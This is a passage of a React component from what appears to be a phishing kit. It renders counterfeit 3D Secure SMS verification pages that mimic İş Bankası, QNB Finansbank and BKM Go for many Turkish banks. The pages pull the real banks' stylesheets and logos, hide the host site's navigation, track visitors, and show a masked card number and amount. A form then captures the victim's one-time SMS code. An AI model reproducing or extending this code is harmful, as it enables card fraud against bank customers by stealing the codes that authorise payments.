                                                <div id="timerDiv" className="has-timer"> <span>Kalan Süre: </span> <span className="has-counter" id="time">{formatTime(timeLeft)}</span> </div>
                                            )}
                                        </div>
                                    </form>
                                    <div id="helpArea" className="noscriptHelpText" style={{ display: 'none' }}>3D Secure, internet alışverişlerinde kart sahibinin kimliğinin doğrulanması amacıyla kullanılan, hem kart sahiplerini hem de alışveriş yaptığınız firmayı sahtekarlıklara karşı koruyan uluslararası bir güvenli alışveriş çözümüdür.
                                        <br />Cep telefonunuza doğrulama kodu gelmemesi ya da doğrulama kodunun gönderildiği telefon numaranızın güncel olmaması gibi durumlarda 0850 222 0 900 numaralı QNB Finansbank Çağrı Merkezi ile iletişime geçebilirsiniz.</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 5. İŞ BANKASI RENDER
    const renderIsbankasi = () => {
        return (
            <>
                <OnlineTracker />
                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css" />
                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    body { background: #fff !important; }
                    #state-bekle { text-align:center; padding:30px 20px; }
                    #state-bekle .isb-spinner { width:40px;height:40px;border:4px solid #e0e6f0;border-top-color:#1a3668;border-radius:50%;animation:isb-spin 1s linear infinite;margin:0 auto 12px; }
                    @keyframes isb-spin { to { transform:rotate(360deg); } }
                    #hata-box { display:none; }
                `}</style>
                <div style={{ maxWidth: '480px', margin: '0 auto', background: '#fff' }} className="IsBankMain">
                    <div className="container-fluid header Maximum">
                        <div className="container d-flex justify-content-between align-items-center" style={{ width: '100%' }}>
                            <div className="col-xs-6 header-left"></div>
                            <div className="col-xs-6 header-right" style={{ textAlign: 'right' }}></div>
                        </div>
                    </div>
                    <div className="container-fluid cardno">
                        <div className="container">
                            <h1 style={{ fontSize: '14px', margin: 0 }}>
                                <span className="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span className="lastDigits"> {data?.lastFourDigits} </span>
                            </h1>
                        </div>
                    </div>
                    <div className="container-fluid details">
                        <div className="container">
                            <div className="col-xs-12 row align-items-center">
                                <div className="col-xs-12 col-sm-4 merchant">
                                    <span>{data?.isyeriAdi}</span>
                                </div>
                                <div className="col-xs-6 col-sm-4 amount">
                                    <span> {cleanTutar} ₺</span>
                                </div>
                                <div className="col-xs-6 col-sm-4 date">
                                    <span> {data?.tarih} </span>
                                </div>
                            </div>
                            {error && (
                                <div className="col-xs-12 date mt-2" id="hata-box" style={{ display: 'block' }}>
                                    <span style={{ color: 'red' }}>{error}</span>
                                </div>
                            )}
                        </div>
                    </div>

                    <div className="container-fluid content">
                        <div className="container">
                            <div className="col-xs-12">

                                {isSubmitting ? (
                                    <div id="state-bekle">
                                        <div className="isb-spinner"></div>
                                        <div className="col-xs-12 info">
                                            <p className="smallScreenText">SMS doğrulama kodunuz gönderiliyor, lütfen bekleyiniz...</p>
                                        </div>
                                    </div>
                                ) : (
                                    <div id="state-kod">
                                        <div className="col-xs-12 info">
                                            <p className="smallScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>{data?.maskedPhone}</strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep'e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
                                        </div>
                                        <div className="col-xs-12 formHolder">
                                            <form method="POST" id="chnte" onSubmit={handleSubmit}>
                                                <input 
                                                    ref={inputRef}
                                                    id="sms-kod" 
                                                    name="sms" 
                                                    type="tel" 
                                                    inputMode="numeric"
                                                    minLength={5} 
                                                    maxLength={6} 
                                                    placeholder="Doğrulama Kodu" 
                                                    required
                                                    value={smsCode}
                                                    onChange={(e) => {
                                                        setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                        setError('');
                                                    }}
                                                    disabled={isTimeout}
                                                />
                                                <input 
                                                    id="acs-submit-btn" 
                                                    type="submit" 
                                                    value="ONAYLA" 
                                                    className="primary" 
                                                    disabled={isTimeout || smsCode.length < 5} 
                                                />
                                                <input id="reSendButton" type="button" value="Tekrar Gönder" className="primary inProgress" disabled style={{ display: 'none' }} />
                                            </form>
                                            <div className="row mt-3">
                                                <div className="col-6">
                                                    <button type="button" onClick={handleCancel} className="btn btn-link p-0 text-left" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>İşlemi İptal Et</button>
                                                </div>
                                                <div className="col-6 text-right">
                                                    <button type="button" className="btn btn-link p-0 text-right" style={{ fontSize: '13px', color: '#1a3668', fontWeight: 'bold', background: 'none', border: 'none' }}>Yardım</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {isTimeout ? (
                                    <div className="text-center mb-3">
                                        <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
                                        <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Tekrar Gönder</button>
                                    </div>
                                ) : (
                                    <div className="col-xs-12 countdown">
                                        <div id="progressBar">
                                            <div style={{ width: '100%', overflow: 'hidden', background: '#1a3668', color: '#fff', textAlign: 'center', padding: '2px 0' }}>
                                                Kalan Süre: {formatTime(timeLeft)}
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                    <div className="container-fluid footer">
                        <div className="container">
                            <p>KART BİLGİLERİNİZ İŞYERİ İLE <strong><u>KESİNLİKLE PAYLAŞILMAMAKTADIR</u></strong>. </p>
                            <img src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png" alt="isbank" />
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // 6. BKM GO RENDER
    const renderBkmGo = (logoUrl: string) => {
        return (
            <>
                <OnlineTracker />
                <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                <style jsx global>{`
                    nav.fixed.bottom-0 { display: none !important; }
                    main { padding-bottom: 0 !important; }
                    header { display: none !important; }
                    #state-bekle { text-align:center; padding: 30px 20px; }
                    #state-bekle .go-spinner { width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#00aeef;border-radius:50%;animation:go-spin 1s linear infinite;margin:0 auto 12px; }
                    @keyframes go-spin { to { transform:rotate(360deg); } }
                `}</style>
                <div className="content-wrapper" style={{ margin: '0 auto', maxWidth: '480px' }}>
                    <div className="header">
                        <div className="brand-logo">
                            <img style={{ float: 'left' }} src="https://goguvenliodeme.bkm.com.tr/images/go.png" alt="GO" />
                        </div>
                        <div className="member-logo">
                            {/* eslint-disable-next-line @next/next/no-img-element */}
                            <img style={{ float: 'right' }} src={logoUrl} alt="Bank Logo" onError={(e) => {
                                (e.target as HTMLImageElement).src = "/api/csfour-proxy/staticimage/carrefoursacom-logo.svg";
                            }} />
                        </div>
                    </div>
                    <div id="approve-page">
                        <div className="content">
                            <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
                            <div className="info-wrapper">
                                <div className="info-row">
                                    <div className="info-col info-label">İşyeri Adı:</div>
                                    <div className="info-col" id="merchant-name">{data?.isyeriAdi}</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tutarı:</div>
                                    <div className="info-col amount" id="amount">{cleanTutar} ₺</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">İşlem Tarihi-Saati:</div>
                                    <div className="info-col" id="operation-date-time">{data?.tarih}</div>
                                </div>
                                <div className="info-row">
                                    <div className="info-col info-label">Kart Numarası:</div>
                                    <div className="info-col" id="masked-pan">XXXX XXXX XXXX {data?.lastFourDigits}</div>
                                </div>
                            </div>
                            <div className="action-wrapper">
                                <div className="info-message h3">
                                    {error && <p id="hata-box" style={{ color: 'red', display: 'block' }}>{error}</p>}

                                    {isSubmitting ? (
                                        <div id="state-bekle">
                                            <div className="go-spinner"></div>
                                            <h3>SMS şifreniz gönderiliyor, lütfen bekleyiniz...</h3>
                                        </div>
                                    ) : (
                                        <div id="state-kod">
                                            <h3><div id="auth-message">İşlemi tamamlamak için kullanacağınız şifreniz bankanızda kayıtlı cep telefonunuza gönderilecektir.<br />Referans no: <span id="otpRefNo"> {referansNo} </span></div></h3>
                                        </div>
                                    )}
                                </div>

                                <div className="form-wrapper" id="state-form" style={{ display: isSubmitting ? 'none' : '' }}>
                                    <form className="form-code" autoComplete="off" method="POST" onSubmit={handleSubmit}>
                                        <div className="form-row">
                                            <label htmlFor="sms-kod" className="otpcode">Doğrulama Kodu</label>
                                            <input 
                                                ref={inputRef}
                                                type="tel" 
                                                className="f-input" 
                                                name="sms" 
                                                id="sms-kod"
                                                minLength={5} 
                                                maxLength={6} 
                                                inputMode="numeric"
                                                pattern="[0-9]*" 
                                                autoComplete="off" 
                                                required 
                                                autoFocus
                                                value={smsCode}
                                                onChange={(e) => {
                                                    setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6));
                                                    setError('');
                                                }}
                                                disabled={isTimeout}
                                            />
                                        </div>
                                        <div className="error-messages error-wrong-otp" style={{ display: 'none' }}>
                                            <span>Doğrulama Kodunu hatalı girdiniz.Lütfen kontrol ederek tekrar deneyiniz.</span>
                                        </div>
                                        <div id="submitButtonDiv">
                                            <div className="has-submit">
                                                <button id="acs-submit-btn" type="submit" className="button btn-1 btn-commit" disabled={isTimeout || smsCode.length < 5}>Onayla</button>
                                            </div>
                                            {isTimeout ? (
                                                <div className="text-center mb-3">
                                                    <span className="text-danger d-block mb-1" style={{ fontSize: '12px' }}>Zaman aşımı nedeniyle kod geçerliliğini yitirdi.</span>
                                                    <button type="button" onClick={handleRetry} className="btn btn-sm btn-outline-secondary">Yeniden Gönder</button>
                                                </div>
                                            ) : (
                                                <div id="timerDiv" className="has-timer">
                                                    <span>Kalan Süre: </span> <span className="has-counter" id="time">{formatTime(timeLeft)}</span>
                                                </div>
                                            )}
                                        </div>
                                    </form>
                                    <div className="call-to-action">
                                        <div className="action-list">
                                            <div className="action-row">
                                                <div className="action-col left">
                                                    <button type="button" onClick={handleCancel} className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>İşlemi İptal Et</button>
                                                </div>
                                                <div className="action-col right">
                                                    <button type="button" className="txt-link text-primary bg-transparent border-0" style={{ cursor: 'pointer', fontFamily: 'inherit' }}>Yardım</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </>
        );
    };

    // Banka adına göre render yöntemini belirle
    let bankContent = null;
    if (bank.includes('garanti') || bank.includes('bonus')) {
        bankContent = renderGaranti();
    } else if (bank.includes('akbank') || bank.includes('axess')) {
        bankContent = renderAkbank();
    } else if (bank.includes('deniz')) {
        bankContent = renderDenizbank();
    } else if (bank.includes('finans') || bank.includes('qnb')) {
        bankContent = renderFinansbank();
    } else if (bank.includes('isbank') || bank.includes('işbank') || bank.includes('maximum')) {
        bankContent = renderIsbankasi();
    } else {
        // Varsayılan BKM Go tasarımı ve banka logoları eşleşmesi
        let bankLogo = 'https://goguvenliodeme.bkm.com.tr/images/go.png';
        if (bank.includes('ziraat')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ziraatbankasi.png';
        } else if (bank.includes('vakif') || bank.includes('vakıf')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/vakifbank.png';
        } else if (bank.includes('halk')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/halkbank.png';
        } else if (bank.includes('ing')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ing.png';
        } else if (bank.includes('yapi') || bank.includes('yapı') || bank.includes('world') || bank.includes('ykb')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png';
        } else if (bank.includes('teb')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/teb.png';
        } else if (bank.includes('şeker') || bank.includes('seker')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/sekerbank.png';
        } else if (bank.includes('hsbc')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/hsbc.png';
        } else if (bank.includes('odea')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/odeabank.png';
        } else if (bank.includes('albaraka')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/albaraka.png';
        } else if (bank.includes('kuveyt')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/kuveytturk.png';
        } else if (bank.includes('turkiye finans') || bank.includes('türkiye finans')) {
            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/turkiyefinans.png';
        }
        bankContent = renderBkmGo(bankLogo);
    }

    return (
        <>
            {!cssLoaded && (
                <div className="flex items-center justify-center min-h-screen bg-white fixed inset-0 z-[100000]">
                    <style jsx global>{`
                        nav.fixed.bottom-0 { display: none !important; }
                        main { padding-bottom: 0 !important; }
                        header { display: none !important; }
                        body { background: #fff !important; }
                    `}</style>
                    <div style={{ width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #3498db', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
                    <style jsx>{`
                        @keyframes spin {
                            0% { transform: rotate(0deg); }
                            100% { transform: rotate(360deg); }
                        }
                    `}</style>
                </div>
            )}
            <div style={{ 
                visibility: cssLoaded ? 'visible' : 'hidden', 
                opacity: cssLoaded ? 1 : 0,
                width: '100%',
                height: '100%'
            }}>
                {bankContent}
            </div>
        </>
    );
}
